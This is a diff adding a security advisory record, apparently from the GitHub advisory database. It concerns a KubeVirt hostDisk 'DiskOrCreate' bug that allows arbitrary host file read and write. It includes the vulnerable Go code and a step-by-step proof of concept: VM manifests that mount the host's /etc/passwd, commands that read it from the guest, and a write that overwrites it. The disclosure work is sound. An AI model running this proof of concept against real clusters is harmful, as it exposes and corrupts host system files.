@@ -1,0 +1,80 @@
+{
+  "id": "GHSA-46xp-26xh-hpqh",
+  "modified": "2025-11-15T02:57:12Z",
+  "published": "2025-11-07T18:46:09Z",
+  "aliases": [
+    "CVE-2025-64324"
+  ],
+  "summary": "KubeVirt Vulnerable to Arbitrary Host File Read and Write",
+  "details": "### Summary\nThe `hostDisk` feature in KubeVirt allows mounting a host file or directory owned by the user with UID 107 into a VM. However, the implementation of this feature and more specifically the `DiskOrCreate` option which creates a file if it doesn't exist, has a logic bug that allows an attacker to read and write arbitrary files owned by more privileged users on the host system.\n\n\n### Details\nThe `hostDisk` feature gate in KubeVirt allows mounting a QEMU RAW image directly from the host into a VM. While similar features, such as mounting disk images from a PVC, enforce ownership-based restrictions (e.g., only allowing files owned by specific UID, this mechanism can be subverted. For a RAW disk image to be readable by the QEMU process running within the `virt-launcher` pod, it must be owned by a user with UID 107. **If this ownership check is considered a security barrier, it can be bypassed**. In addition, the ownership of the host files mounted via this feature is changed to the user with UID 107. \n\nThe above is due to a logic bug in the code of the `virt-handler` component which prepares and sets the permissions of the volumes and data inside which are going to be mounted in the `virt-launcher` pod and consecutively consumed by the VM. It is triggered when one tries to mount a host file or directory using the `DiskOrCreate` option. The relevant code is as follows:\n\n```go\n// pkg/host-disk/host-disk.go\n\nfunc (hdc DiskImgCreator) Create(vmi *v1.VirtualMachineInstance) error {\n\tfor _, volume := range vmi.Spec.Volumes {\n\t\tif hostDisk := volume.VolumeSource.HostDisk; shouldMountHostDisk(hostDisk) {\n\t\t\tif err := hdc.mountHostDiskAndSetOwnership(vmi, volume.Name, hostDisk); err != nil {\n\t\t\t\treturn err\n\t\t\t}\n\t\t}\n\t}\n\treturn nil\n}\n\nfunc shouldMountHostDisk(hostDisk *v1.HostDisk) bool {\n\treturn hostDisk != nil \u0026\u0026 hostDisk.Type == v1.HostDiskExistsOrCreate \u0026\u0026 hostDisk.Path != \"\"\n}\n\nfunc (hdc *DiskImgCreator) mountHostDiskAndSetOwnership(vmi *v1.VirtualMachineInstance, volumeName string, hostDisk *v1.HostDisk) error {\n\tdiskPath := GetMountedHostDiskPathFromHandler(unsafepath.UnsafeAbsolute(hdc.mountRoot.Raw()), volumeName, hostDisk.Path)\n\tdiskDir := GetMountedHostDiskDirFromHandler(unsafepath.UnsafeAbsolute(hdc.mountRoot.Raw()), volumeName)\n\tfileExists, err := ephemeraldiskutils.FileExists(diskPath)\n\tif err != nil {\n\t\treturn err\n\t}\n\tif !fileExists {\n\t\tif err := hdc.handleRequestedSizeAndCreateSparseRaw(vmi, diskDir, diskPath, hostDisk); err != nil {\n\t\t\treturn err\n\t\t}\n\t}\n\t// Change file ownership to the qemu user.\n\tif err := ephemeraldiskutils.DefaultOwnershipManager.UnsafeSetFileOwnership(diskPath); err != nil {\n\t\tlog.Log.Reason(err).Errorf(\"Couldn't set Ownership on %s: %v\", diskPath, err)\n\t\treturn err\n\t}\n\treturn nil\n}\n```\n\n\nThe root cause lies in the fact that if the specified by the user file does not exist, it is created by the `handleRequestedSizeAndCreateSparseRaw` function. However, this function does not explicitly set file ownership or permissions. As a result, the logic in `mountHostDiskAndSetOwnership` proceeds to the branch marked with `// Change file ownership to the qemu user`, assuming ownership should be applied. This logic fails to account for the scenario where the file already exists and may be owned by a more privileged user. \nIn such cases, changing file ownership without validating the file's origin introduces a security risk: it can unintentionally grant access to sensitive host files, compromising their integrity and confidentiality. This may also enable an **External API Attacker** to disrupt system availability.\n\n\n### PoC\nTo demonstrate this vulnerability, the `hostDisk` feature gate should be enabled when deploying the KubeVirt stack. \n\n```yaml\n# kubevirt-cr.yaml\napiVersion: kubevirt.io/v1\nkind: KubeVirt\nmetadata:\n  name: kubevirt\n  namespace: kubevirt\nspec:\n  certificateRotateStrategy: {}\n  configuration:\n    developerConfiguration:\n      featureGates:\n        -  HostDisk\n  customizeComponents: {}\n  imagePullPolicy: IfNotPresent\n  workloadUpdateStrategy: {}\n```\n\n\nInitially, if one tries to create a VM and mount `/etc/passwd` from the host using the `Disk` option which assumes that the file already exists, the following error is returned:\n\n```yaml\n# arbitrary-host-read-write.yaml\napiVersion: kubevirt.io/v1\nkind: VirtualMachine\nmetadata:\n  name: arbitrary-host-read-write\nspec:\n  runStrategy: Always\n  template:\n    metadata:\n      labels:\n        kubevirt.io/size: small\n        kubevirt.io/domain: arbitrary-host-read-write\n    spec:\n      domain:\n        devices:\n          disks:\n            - name: containerdisk\n              disk:\n                bus: virtio\n            - name: cloudinitdisk\n              disk:\n                bus: virtio\n            - name: host-disk\n              disk:\n                bus: virtio\n          interfaces:\n          - name: default\n            masquerade: {}\n        resources:\n          requests:\n            memory: 64M\n      networks:\n      - name: default\n        pod: {}\n      volumes:\n        - name: containerdisk\n          containerDisk:\n            image: quay.io/kubevirt/cirros-container-disk-demo\n        - name: cloudinitdisk\n          cloudInitNoCloud:\n            userDataBase64: SGkuXG4=\n        - name: host-disk\n          hostDisk:\n            path: /etc/passwd\n            type: Disk\n```\n\n\n```bash\n# Deploy the above VM manifest\noperator@minikube:~$ kubectl apply -f arbitrary-host-read-write.yaml\n# Observe the deployment status\noperator@minikube:~$ kubectl get vm\nNAME                        AGE     STATUS             READY\narbitrary-host-read-write   7m55s   CrashLoopBackOff   False\n# Inspect the reason for the `CrashLoopBackOff`\noperator@minikube:~$ kubectl get vm arbitrary-host-read-write  -o jsonpath='{.status.conditions[3].message}'\nserver error. command SyncVMI failed: \"LibvirtError(Code=1, Domain=10, Message='internal error: process exited while connecting to monitor: 2025-05-20T20:14:01.546609Z qemu-kvm: -blockdev {\\\"driver\\\":\\\"file\\\",\\\"filename\\\":\\\"/var/run/kubevirt-private/vmi-disks/host-disk/passwd\\\",\\\"aio\\\":\\\"native\\\",\\\"node-name\\\":\\\"libvirt-1-storage\\\",\\\"read-only\\\":false,\\\"discard\\\":\\\"unmap\\\",\\\"cache\\\":{\\\"direct\\\":true,\\\"no-flush\\\":false}}: Could not open '/var/run/kubevirt-private/vmi-disks/host-disk/passwd': Permission denied')\"\n```\n\nThe hosts's `/etc/passwd` file's owner and group are `0:0` (`root:root`) hence, when one tries to deploy the above `VirtualMachine` definition, it gets a `PermissionDenied` error because the file is not owned by the user with UID `107` (`qemu`):\n\n\n```bash\n# Inspect the ownership of the host's mounted `/etc/passwd` file within the `virt-launcher` pod responsible for the VM\noperator@minikube:~$ kubectl exec -it virt-launcher-arbitrary-host-read-write-tjjkt -- ls -al /var/run/kubevirt-private/vmi-disks/host-disk/passwd\n-rw-r--r--. 1 root root 1276 Jan 13 17:10 /var/run/kubevirt-private/vmi-disks/host-disk/passwd\n```\n\nHowever, if one uses the `DiskOrCreate` option, the file's ownership is silently changed to `107:107` (`qemu:qemu`) before the VM is started which allows the latter to boot, and then read and modify it.\n\n```yaml\n...\nhostDisk:\n            capacity: 1Gi\n            path: /etc/passwd\n            type: DiskOrCreate\n```\n\n```bash\n# Apply the modified manifest\noperator@minikube:~$ kubectl apply -f arbitrary-host-read-write.yaml\n# Observe the deployment status\noperator@minikube::~$ kubectl get vm\nNAME                        AGE     STATUS             READY\narbitrary-host-read-write   7m55s   Running   False\n# Initiate a console connection to the running VM\noperator@minikube: virtctl console arbitrary-host-read-write\n...\n```\n\n```bash\n# Within the VM arbitrary-host-read-write, inspect the present block devices and their contents\nroot@arbitrary-host-read-write:~$ lsblk\nNAME    MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT\nvda     253:0    0   44M  0 disk\n|-vda1  253:1    0   35M  0 part /\n`-vda15 253:15   0    8M  0 part\nvdb     253:16   0    1M  0 disk\nvdc     253:32   0  1.5K  0 disk\nroot@arbitrary-host-read-write:~$ cat /dev/vdc\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n_rpc:x:101:65534::/run/rpcbind:/usr/sbin/nologin\nsystemd-network:x:102:106:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:103:107:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nstatd:x:104:65534::/var/lib/nfs:/usr/sbin/nologin\nsshd:x:105:65534::/run/sshd:/usr/sbin/nologin\ndocker:x:1000:999:,,,:/home/docker:/bin/bash\n# Write into the block device backed up by the host's `/etc/passwd` file\nroot@arbitrary-host-read-write:~$ echo \"Quarkslab\" | tee -a /dev/vdc\n```\n\nIf one inspects the file content of the host's `/etc/passwd` file, they will see that it has changed alongside its ownership:\n\n```bash\n# Inspect the contents of the file\noperator@minikube:~$ cat /etc/passwd\nQuarkslab\n:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n_rpc:x:101:65534::/run/rpcbind:/usr/sbin/nologin\nsystemd-network:x:102:106:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:103:107:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nstatd:x:104:65534::/var/lib/nfs:/usr/sbin/nologin\nsshd:x:105:65534::/run/sshd:/usr/sbin/nologin\ndocker:x:1000:999:,,,:/home/docker:/bin/bash\n# Inspect the permissions of the file\noperator@minikube:~$ ls -al /etc/passwd\n-rw-r--r--. 1 107 systemd-resolve 1276 May 20 20:35 /etc/passwd\n# Test the integrity of the system\noperator@minikube: $sudo su\nsudo: unknown user root\nsudo: error initializing audit plugin sudoers_audit\n```\n\n### Impact\n\nHost files arbitrary read and write - this vulnerability it can unintentionally grant access to sensitive host files, compromising their integrity and confidentiality.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "kubevirt.io/kubevirt",
+        "purl": "pkg:golang/kubevirt.io/kubevirt"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.6.1"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/11/GHSA-46xp-26xh-hpqh/GHSA-46xp-26xh-hpqh.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "kubevirt.io/kubevirt",
+        "purl": "pkg:golang/kubevirt.io/kubevirt"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "1.6.2"
+            },
+            {
+              "fixed": "1.7.0-rc.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/11/GHSA-46xp-26xh-hpqh/GHSA-46xp-26xh-hpqh.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/kubevirt/kubevirt/security/advisories/GHSA-46xp-26xh-hpqh"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/kubevirt/kubevirt/pull/15037"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/kubevirt/kubevirt/commit/00d03e43e3bf03e563136695a4732b65ed42d764"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/kubevirt/kubevirt/commit/ff3b69b08b6b9c8d08d23735ca8d82455f790a69"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/kubevirt/kubevirt"
+    }
+  ]
+}
